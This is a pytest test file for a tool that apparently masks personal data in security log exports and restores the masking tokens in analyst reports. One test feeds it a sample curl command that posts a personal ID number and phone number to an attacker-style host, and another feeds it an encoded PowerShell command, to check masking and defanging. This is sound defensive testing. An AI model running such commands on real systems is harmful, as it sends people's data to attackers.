import json
import os
import stat
from pathlib import Path

import pytest

from masquer import detect
from masquer.case import Case
from masquer.masker import Masker, collapse
from masquer.store import TOKEN_RE, Store
from masquer.synth import generate
from masquer.triere import compile_literals

# Kinds that only the name-detection stage (local model) can find in free
# text. Everything else must never leak.
NER_KINDS = {"person_name", "file_pii"}


def masker(tmp_path, deny=frozenset()):
    return Masker(Store(tmp_path / "m.sqlite"), set(deny))


# --- store ------------------------------------------------------------------

def test_store_stable_tokens_and_mode(tmp_path):
    s = Store(tmp_path / "m.sqlite")
    a = s.token("UPN", "Anna@Example.test")
    assert a == s.token("UPN", "anna@example.test")
    assert a != s.token("UPN", "erik@example.test")
    assert TOKEN_RE.fullmatch(a)
    s.close()
    assert stat.S_IMODE(os.stat(tmp_path / "m.sqlite").st_mode) == 0o600
    assert Store(tmp_path / "m.sqlite").token("UPN", "anna@example.test") == a


def test_scratch_does_not_touch_case(tmp_path):
    s = Store(tmp_path / "m.sqlite")
    s.token("HOST", "a.example")
    sc = s.scratch()
    sc.token("HOST", "b.example")
    assert len(s.originals()) == 1


def test_trie_regex_bounds():
    rx = compile_literals(["anna", "anna.lindqvist", "nor"])
    assert rx.findall("user anna.lindqvist and Anna, not annabel or minor") == ["anna.lindqvist", "Anna"]


# --- detectors --------------------------------------------------------------

@pytest.mark.parametrize("value,ok", [
    ("811218-9876", True), ("811218-9875", False), ("19811218-9876", True),
    ("811278-9873", True),  # samordningsnummer (day + 60)
])
def test_personnummer(value, ok):
    assert detect.se_personnummer(value) is ok


def test_iban():
    assert detect.iban_ok("GB82 WEST 1234 5698 7654 32")
    assert not detect.iban_ok("GB82 WEST 1234 5698 7654 33")


def test_column_kinds():
    assert detect.column_kind("DeviceName") == "HOST"
    assert detect.column_kind("InitiatingProcessAccountUpn") == "UPN"
    assert detect.column_kind("ActionType") == "keep"
    assert detect.column_kind("ProcessCommandLine") is None  # free text
    assert detect.column_kind("ProcessVersionInfoFileDescription") is None  # scanned, not kept


# --- masker -----------------------------------------------------------------

def test_text_detectors(tmp_path):
    m = masker(tmp_path)
    t = m.text('curl -d "pnr=811218-9876&tel=+46 70 123 45 67" http://evil.test/x.php '
               r"from 10.1.2.3 by anna@nordvind.example C:\Users\anna.l\Downloads\a.exe "
               "S-1-5-21-1111111111-2222222222-3333333333-1001 SE4550000000058398257466")
    for raw in ["811218-9876", "+46 70 123 45 67", "evil.test", "10.1.2.3", "anna@nordvind.example",
                "anna.l", "S-1-5-21-1111111111", "SE4550000000058398257466"]:
        assert raw not in t, raw
    assert "hxxp://" in t
    assert "a.exe" in t and "Downloads" in t


def test_allowlisted_domain_defanged_not_tokenised(tmp_path):
    t = masker(tmp_path).text("see https://login.microsoftonline.com/common and update.microsoft.com")
    assert "hxxps://login[.]microsoftonline[.]com/common" in t
    assert "update[.]microsoft[.]com" in t


def test_sweep_finds_known_values_in_text(tmp_path):
    m = masker(tmp_path, deny={"Nordvind AB"})
    m.value("AccountDisplayName", "Åsa Öberg")
    m.refresh_sweep()
    t = m.text("Mail from Åsa Öberg about NORDVIND AB payroll")
    assert "Öberg" not in t and "NORDVIND" not in t


def test_blob_replaced(tmp_path):
    t = masker(tmp_path).text("powershell -enc " + "QQBCAEMA" * 20)
    assert "«BLOB sha256=" in t and "QQBCAEMA" not in t


def test_dynamic_json(tmp_path):
    out = json.loads(masker(tmp_path).value("AdditionalFields",
                                            '{"Mailbox":"erik@x.example","Port":445,"Note":"call +4670 1234567"}'))
    assert out["Port"] == 445 and "erik@" not in out["Mailbox"] and "+4670" not in out["Note"]


def test_collapse_gap():
    base = {"DeviceName": "«HOST_0001»", "ActionType": "ConnectionSuccess"}
    rows = [dict(base, Timestamp=t) for t in
            ["2026-11-01T08:00:00Z", "2026-11-01T08:30:00Z", "2026-11-01T09:10:00Z", "2026-11-01T12:00:00Z"]]
    out = collapse(rows, 3600)
    assert [r["Count"] for r in out] == [3, 1]
    assert out[0]["FirstSeen"] == "2026-11-01T08:00:00Z" and out[0]["LastSeen"] == "2026-11-01T09:10:00Z"


# --- case: import, gate, outbox, restore -------------------------------------

@pytest.fixture(scope="module")
def synth_case(tmp_path_factory):
    root = tmp_path_factory.mktemp("leak")
    tables = ["DeviceProcessEvents", "DeviceNetworkEvents", "DeviceLogonEvents", "DeviceFileEvents",
              "EmailEvents", "IdentityInfo", "AlertEvidence", "CloudAppEvents", "DeviceEvents"]
    generate(root / "synth", tables=tables, rows=80, seed=11)
    case = Case.create(root / "case")
    case.import_files(sorted((root / "synth").glob("*.csv")))
    paths = case.outbox(allow_without_ner=True, max_chars=10_000_000)
    canaries = json.loads((root / "synth" / "canaries.json").read_text("utf-8"))["canaries"]
    return case, paths, canaries


def test_case_permissions(synth_case):
    case, paths, _ = synth_case
    assert stat.S_IMODE(os.stat(case.root).st_mode) == 0o700
    for p in [case.root / "map.sqlite", *paths, *(case.root / "masked").glob("*.json")]:
        assert stat.S_IMODE(os.stat(p).st_mode) == 0o600, p


def test_no_canary_leaks(synth_case):
    _, paths, canaries = synth_case
    text = "".join(p.read_text("utf-8") for p in paths).casefold()
    leaks = {k: [v for v in vals if v.casefold() in text] for k, vals in canaries.items() if k not in NER_KINDS}
    leaks = {k: v for k, v in leaks.items() if v}
    assert not leaks, {k: v[:3] for k, v in leaks.items()}


def test_outbox_needs_flag_without_ner(synth_case):
    case, _, _ = synth_case
    with pytest.raises(SystemExit, match="allow-without-ner"):
        case.outbox()


def test_gate_blocks_planted_leak(synth_case):
    case, _, _ = synth_case
    st = case.store()
    original = next(o for o in st.originals() if "@" in o)
    problems = case.gate(f"text with {original} in it", st)
    st.close()
    assert any("original value still present" in p for p in problems)


def test_gate_catches_new_identifier(synth_case):
    case, _, _ = synth_case
    st = case.store()
    before = len(st.originals())
    problems = case.gate("new mail fresh.person@unseen.example", st)
    assert any("EMAIL" in p for p in problems)
    assert len(st.originals()) == before  # the gate never adds tokens
    st.close()


def test_restore_roundtrip(synth_case, tmp_path):
    case, paths, _ = synth_case
    st = case.store()
    lookup = st.lookup()
    st.close()
    tok, original = next((t, o) for t, o in lookup.items() if t.startswith("«HOST_"))
    bare = tok.strip("«»")
    kind, num = bare.rsplit("_", 1)
    inbox = case.root / "inbox-1.md"
    inbox.write_text(f"Device {tok} was hit. Also {kind}_{int(num)} and «HOST_9999».", encoding="utf-8")
    dest, stats = case.restore(inbox)
    out = dest.read_text("utf-8")
    assert dest.name == "report-1.md"
    assert out.count(original) == 2
    assert "⚠ unknown token" in out and "⚠(was" in out
    assert stats["restored"] == 1 and stats["unknown"] == 1 and stats["restored_altered"] == 1


def test_restore_cli_missing_and_default(synth_case, capsys):
    from masquer.cli import main

    case, _, _ = synth_case
    for p in case.root.glob("inbox-*.md"):
        p.unlink()
    assert main(["restore", str(case.root)]) == 2
    assert "no inbox-N.md" in capsys.readouterr().err
    assert main(["restore", str(case.root), str(case.root / "inbox-7.md")]) == 2
    (case.root / "inbox-2.md").write_text("nothing to restore", encoding="utf-8")
    assert main(["restore", str(case.root)]) == 0
    assert (case.root / "report-2.md").exists()
